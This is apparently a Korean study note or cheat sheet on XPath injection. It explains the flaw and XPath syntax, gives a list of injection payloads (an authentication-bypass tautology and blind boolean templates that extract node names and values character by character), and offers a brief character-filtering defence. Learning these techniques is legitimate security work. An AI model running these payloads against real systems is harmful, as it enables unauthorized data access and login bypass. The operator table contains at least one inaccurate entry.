# XPath Injection

## XPath Injection?

XML 구조에 악의적인 행위를 일으키는 내용을 삽입하거나 Xpath를 조작하여 XML의 내용을 노출하는 취약점이다.

SQL Injection과 마찬가지로 XPath Injection은 XML 데이터에 대한 XPath 쿼리를 구성할 때 발생됩니다.

의도적으로 조작한 내용을 전송함으로써 XML 데이터가 구성을 보거나, 액세스할 수 없는 데이터를 액세스할 수 있습니다. XML 데이터가 인증에 사용되는 경우 웹 사이트에 대한 권한을 높일 수도 있습니다.

<br>

### XPath?

XPath는 XML 문서를 노드 트리로 모델링하여 경로 표현식(Path Expression)을 통해 XML 문서의 노드 또는 노드 집합을 선택한다. XPath 노드들은 총 7개로 구성되어 있으며, 이러한 노드에 접근하기 편하도록 XPath는 다양한 명령어를 제공한다.

XPath는 XSLT와 XPointer에서 모두 사용하도록 설계된 XML 문서의 일부를 처리하기 위한 언어입니다. 대부분의 경우 XPath 표현식은 문서의 한 노드에서 다른 노드로 이동하는 데 필요한 일련의 단계를 나타냅니다.

XPath는 일종의 쿼리로 XML 데이터베이스 내용을 선택하고 조작하기 위하여 사용한다.

<br>

### XPath Node

- root nodes
- element nodes
- text nodes
- attribute nodes
- namespace nodes
- processing instruction nodes
- comment nodes

<br>

### XPath 명령어

|명렁어|설명|
|:---:|:---:|
|/|최상위 노드|
|//|현재 노드|
|*|모든 노드 조회|
|.|현재 노드|
|..|현재 상위 노드 접근|
|parent|현재 노드의 부모 노드|
|child|현재 노드의 자식 노드|
|[]|조건문|
|node()|현재 노드로부터 모든 노드 조회|

<br>

## 🚩 Offensive techniques

```
' or 1=1 or '

[true value]' and count(../child::*)=[1,2,3 ...] or 'a'='b

[true value]' and string-length(name(parent::*))=[1,2,3 ...] or 'a'='b

[true value]' and substring(name(parent::*),1,1)=[value] or 'a'='b

[true value]' and string-length(name(../child::*[position()=1]))=[1,2,3 ...] or 'a'='b

[true value]' and substring(name(../child::*[position()=1]),1,1)=[value] or 'a'='b

[true value]' and substring(name(.),1,1)=[value] or 'a'='b

[true value]' and count(/heroes/hero/child::*)=[1,2,3 ...] or 'a'='b

[true value]' and string-length(name(//hero[1]/child::*[position()=1]))=[1,2,3 ...] or 'a'='b

[true value]' and substring(name(//hero[1]/child::*[position()=1]),1,1)=[value] or 'a'='b

[true value]' and string-length(string(//hero[1]/id))=[value] or 'a'='b

[true value]' and substring(string(//hero[1]/id),1,1)=[value] or 'a'='b
```

<br>

## 🛡 Denfensive techniques

' [ ] : , * / 스페이스바 를 공백으로 대체합니다. replace 함수를 이용해서 인젝션에 사용되는 문자를 공백으로 대체합니다. 즉, 필터링 합니다.

<br>

## Reference

https://owasp.org/www-community/attacks/XPATH_Injection

https://ethical-hack.tistory.com/25